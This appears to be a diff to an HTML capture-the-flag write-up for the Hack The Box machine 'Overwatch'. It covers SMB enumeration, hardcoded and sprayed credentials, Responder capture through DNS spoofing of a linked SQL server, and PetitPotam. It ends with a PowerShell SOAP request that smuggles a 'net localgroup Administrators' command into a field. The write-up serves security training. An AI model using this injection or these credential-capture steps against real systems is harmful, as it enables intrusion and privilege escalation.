@@ -25,11 +25,12 @@
         <article class="panel writeup-content">
             <span class="eyebrow">Hack The Box — Windows Medium</span>
             <h1>Overwatch Writeup</h1>
-            <p><strong>Author:</strong> atrox | <strong>Tags:</strong> Active Directory, WCF, MSSQL, PetitPotam</p>
+            <p><strong>Author:</strong> atrox | <strong>Tags:</strong> Active Directory, WCF, MSSQL, PetitPotam, Unconstrained Delegation, SOAP Injection</p>
             <hr style="border: 0; border-top: 1px solid var(--border); margin: 30px 0;">
 
             <h2>Overview</h2>
             <p>Overwatch is a Windows Active Directory machine that chains together several attack techniques: SMB enumeration leading to credential discovery in a .NET binary, SQL linked-server abuse to capture cleartext credentials via Responder, a foothold via WinRM, and finally privilege escalation through a vulnerable WCF SOAP service running as SYSTEM.</p>
+            <p>The LDAP banner reveals the domain: <strong>overwatch.htb</strong> / host: <strong>S200401</strong>.</p>
 
             <h2>Reconnaissance</h2>
             <h3>Nmap</h3>
@@ -41,25 +42,55 @@
                     <tr><td>88</td><td>Kerberos</td></tr>
                     <tr><td>445</td><td>SMB</td></tr>
                     <tr><td>3389</td><td>RDP</td></tr>
+                    <tr><td>389</td><td>LDAP</td></tr>
+                    <tr><td>3268</td><td>LDAP Global Catalog</td></tr>
                 </tbody>
             </table>
 
             <h2>Enumeration</h2>
+            <h3>SMB — Anonymous Access</h3>
+            <pre><code>crackmapexec smb 10.129.16.26 -u guest -p '' --shares</code></pre>
+            <p>Exploring the <code>software$</code> share reveals a <code>\Monitoring\</code> directory containing a .NET application: <strong>overwatch.exe</strong>.</p>
+
+            <h3>WCF Service Discovery</h3>
+            <p>The application configuration file reveals a WCF service endpoint usually filtered from external access:</p>
+            <pre><code>&lt;add baseAddress="http://overwatch.htb:8000/MonitorService" /&gt;</code></pre>
+
             <h3>Credentials in the Binary</h3>
             <p>Running <code>strings</code> against <code>overwatch.exe</code> reveals a hardcoded SQL connection string:</p>
             <pre><code>Server=localhost;Database=SecurityLogs;User Id=sqlsvc;Password=TI0LKcfHzZw1Vv;</code></pre>
 
-            <h2>Lateral Movement — Linked Server Abuse</h2>
-            <p>By querying a linked server named <strong>SQL07</strong> and spoofing DNS, we can capture cleartext credentials using Responder:</p>
+            <h3>User Enumeration & Password Spray</h3>
+            <p>Using <code>kerbrute</code> for user enumeration and <code>crackmapexec</code> for a spray, we confirm several service accounts:</p>
+            <ul>
+                <li><strong>sqlsvc : TI0LKcfHzZw1Vv</strong></li>
+                <li><strong>svc_monitor : Overwatch2026!</strong></li>
+            </ul>
+
+            <h2>Lateral Movement — Linked Server Credential Capture</h2>
+            <p>After connecting to MSSQL as <code>sqlsvc</code>, we identify a linked server named <strong>SQL07</strong>. By adding a fake DNS record pointing <code>SQL07</code> to our attack machine and running <strong>Responder</strong>, we capture cleartext credentials:</p>
             <pre><code>[MSSQL] Cleartext Username : sqlmgmt
 [MSSQL] Cleartext Password : bIhBbzMMnB82yx</code></pre>
 
+            <h2>Initial Foothold — WinRM</h2>
+            <p>Using the captured credentials, we gain a shell as <code>sqlmgmt</code> via WinRM to collect the user flag.</p>
+
+            <h2>Bonus: PetitPotam & Machine Account Hash</h2>
+            <p>BloodHound reveals that the Domain Controller (<strong>S200401</strong>) has <strong>Unconstrained Delegation</strong> enabled. We can use PetitPotam to coerce authentication and capture the machine account hash.</p>
+
             <h2>Privilege Escalation — WCF SOAP Injection</h2>
-            <p>The WCF service exposes a <code>KillProcess</code> method vulnerable to command injection. We can use this to add our user to the local Administrators group:</p>
+            <p>The WCF service exposures a <code>KillProcess</code> method vulnerable to command injection. We send a crafted SOAP request from our WinRM session to add our user to the local Administrators group:</p>
             <pre><code># PowerShell SOAP Injection Payload
-&lt;KillProcess xmlns='http://tempuri.org/'&gt;
-    &lt;processName&gt;notepad; net localgroup Administrators sqlmgmt /add&lt;/processName&gt;
-&lt;/KillProcess&gt;</code></pre>
+iwr http://overwatch.htb:8000/MonitorService `
+  -Method POST `
+  -Headers @{ "SOAPAction" = '"http://tempuri.org/IMonitoringService/KillProcess"' } `
+  -Body "&lt;s:Envelope xmlns:s='http://schemas.xmlsoap.org/soap/envelope/'&gt;
+    &lt;s:Body&gt;
+      &lt;KillProcess xmlns='http://tempuri.org/'&gt;
+        &lt;processName&gt;notepad; net localgroup Administrators sqlmgmt /add&lt;/processName&gt;
+      &lt;/KillProcess&gt;
+    &lt;/s:Body&gt;
+  &lt;/s:Envelope&gt;"</code></pre>
 
             <div class="hero-meta" style="margin-top: 40px;">
                 <span>Attack Chain:</span>
